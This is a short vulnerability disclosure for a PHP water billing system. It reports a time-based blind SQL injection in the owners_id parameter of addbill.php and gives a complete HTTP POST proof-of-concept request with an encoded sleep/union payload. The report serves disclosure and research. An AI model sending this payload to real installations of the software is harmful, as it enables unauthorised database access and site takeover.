# Water Billing System has SQL injection vulnerabilities

Source code download：https://code-projects.org/water-billing-system-in-php-with-source-code/

version：2023/12/20


Vulnerability Description: The system has an SQL injection vulnerability, which allows attackers to obtain database information and gain website control permissions by inserting malicious SQL statements.

Cause of vulnerability occurrence: The vulnerability appears on line 13 of WBS/addbill.php, The parameter for owners_ID comes from user controlled input and is concatenated into the SQL query statement, resulting in SQL injection

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221643081.png)

Vulnerability verification: After setting up the system, access local port 80

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221643082.png)

Send payload：

```
POST /WBS/addbill.php HTTP/1.1
Host: 192.168.211.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 178
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=da6muj6v42l26djau9bqi70j56
Origin: http://192.168.211.1
Referer: http://192.168.211.1/WBS/bill.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

date=23%2F12%2F22+08%3A16%3A45&owners_id=1%27and%28select%2Afrom%28select%2Bsleep%282%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27&pres=1223&prev=500&price=10&total=Add
```

The response time is 4 seconds, which means it is a multiple of 2, as expected：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221643083.png)

Verify using sqlmap：

![](https://cdn.jsdelivr.net/gh/G1uneko/picture_blog@main/img/202312221643084.png)
